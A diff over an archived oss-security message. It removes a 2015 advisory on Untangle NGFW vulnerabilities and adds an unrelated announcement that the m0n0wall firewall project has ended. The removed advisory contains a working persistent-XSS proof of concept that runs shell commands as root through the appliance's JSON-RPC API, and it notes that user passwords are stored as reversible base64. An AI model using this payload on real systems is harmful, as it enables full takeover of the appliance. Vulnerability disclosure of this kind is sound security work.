@@ -1,59 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/08/3
-Message-ID: <DUB125-W461C653F7E7A2097966E1AD51A0@phx.gbl>
-Date: Sun, 8 Mar 2015 21:32:52 +0000
-From: Hutton <c.e.hutton@...mail.com>
-To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
-CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: Multiple vulnerabilities in Untangle NGFW 9-11
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/15/3
+Message-ID: <20150215163202.GA12719@kludge.henri.nerv.fi>
+Date: Sun, 15 Feb 2015 18:32:02 +0200
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: End of the m0n0wall project
 Content-Type: text/plain; charset=utf-8
 
-Multiple issues have been discovered in the Untangle NGFW virtual 
-appliance. The vendor was unresponsive and uncooperative to the researcher.
+http://m0n0.ch/wall/end_announcement.php
 
-- Persistent XSS leading to root
-Authentication requiredConfirmed in versions 9 and 11 (up to rev r39357)
-Throughout
- the Untangle user interface there are editable data tables for various 
-user configuration options. An example of this is in: Configuration >
- Networking > Port Forwards. This table can be edited by clicking add
- to create a new port forward rule, or directly edited by 
-double-clicking on the table rows themselves.
-The
- problem arises from malicious user input into some of the fields of 
-these editable tables, which is not properly sanitised and allows for 
-execution of user supplied Javascript code in the context of the users 
-browser. Because this configuration data is saved into the backend 
-database, this allows for Persistent XSS in each of the vulnerable 
-fields/tables.
-This XSS attack is particularly 
-devastating due to the fact that the malicious attacker can run commands
- as root on the virtual appliance, allowing for total system takeover. 
-This is because the Untangle JSON-RPC API has access to functionality 
-provided by the ExecManager class 
-(https://gitorious.org/untangle/src/source/381ad9cb2d1d475bb43814b07bbb0df2d1ae7b58:uvm/api/com/untangle/uvm/ExecManager.java),
- which by default allows for arbitrary commands to be run as root on the
- system.
-A POC demonstrating the issue is below:
-Insert
- the following into the srcdoc attribute of a user-controlled iframe in 
-the Description field or another vulnerable field (can also be styled to
- hide etc):
-Test <iframe srcdoc='[insert code]'></iframe> (single quotes)
-Insert:
-<html><head>        <script type="text/javascript" src="/ext4/ext-all-debug.js"></script>        <script type="text/javascript" src="/jsonrpc/jsonrpc.js"></script>        <script type="text/javascript" src="/script/i18n.js"></script>        <script type="text/javascript" src="script/components.js"></script>        <script type="text/javascript" src="script/main.js"></script></head><body onload="exec()"><script type="text/javascript">        function exec() {                var rpc = {};                rpc.jsonrpc = new JSONRpcClient("/webui/JSON-RPC");                var serverUID = rpc.jsonrpc.UvmContext.getServerUID();                alert(serverUID);                rpc.execManager = rpc.jsonrpc.UvmContext.execManager();                var cmd = "whoami > /tmp/who";                var exit = rpc.execManager.execResult(cmd);                alert("Command: " + cmd + " - Exit code: " + exit);        }</script></body></html>
-- Information disclosure from Local Directory
-Authentication requiredConfirmed in versions 9 and 11, not fixed.
-The
- Local Directory interface shows a list of users stored on the Untangle 
-system. Unfortunately, passwords are not sufficiently encrypted to 
-prevent information disclosure.
-Each user in 
-the local directory interface has an attribute, 'passwordBase64Hash', 
-which is the base64 encoded string of the plaintext password. Because 
-base64 is a bi-directional encoding scheme, the passwordBase64Hash 
-attribute can be trivially decoded into the original plaintext string, 
-revealing the password for each user.
+"""
+Dear m0n0wall enthusiasts,
 
-CH
- 		 	   		  
+on this day 12 years ago, I have released the first version of m0n0wall to the
+public. In theory, one could still run that version - pb1 it was called - on a
+suitably old PC and use it to control the Internet access of a small LAN (not
+that it would be recommended security-wise). However, the world keeps turning,
+and while m0n0wall has made an effort to keep up, there are now better solutions
+available and under active development.
+
+Therefore, today I announce that the m0n0wall project has officially ended. No
+development will be done anymore, and there will be no further releases.
+
+The forums and the mailing list will be frozen at the end of this month. All the
+contents of the website, repository, downloads, mailing list and forum will be
+archived in a permanent location on the web so that they remain accessible
+indefinitely to anyone who might be interested in them.
+
+m0n0wall has served as the seed for several other well known open source
+projects, like pfSense, FreeNAS and AskoziaPBX. The newest offspring, OPNsense
+(https://opnsense.org), aims to continue the open source spirit of m0n0wall
+while updating the technology to be ready for the future. In my view, it is the
+perfect way to bring the m0n0wall idea into 2015, and I encourage all current
+m0n0wall users to check out OPNsense and contribute if they can.
+
+Finally, I would like to take this opportunity to thank everyone who has been
+involved in the m0n0wall project and helped in some way or another - by
+contributing code, documentation, answering questions on the mailing list or the
+forum, donating or just spreading the word. It has been a great journey for me,
+and I'm convinced that even now that it has come to an end, the m0n0wall spirit
+will live on in the various projects it has spawned.
+
+Manuel Kasper
+15 February 2015
+"""
+
+-- 
+Henri Salo
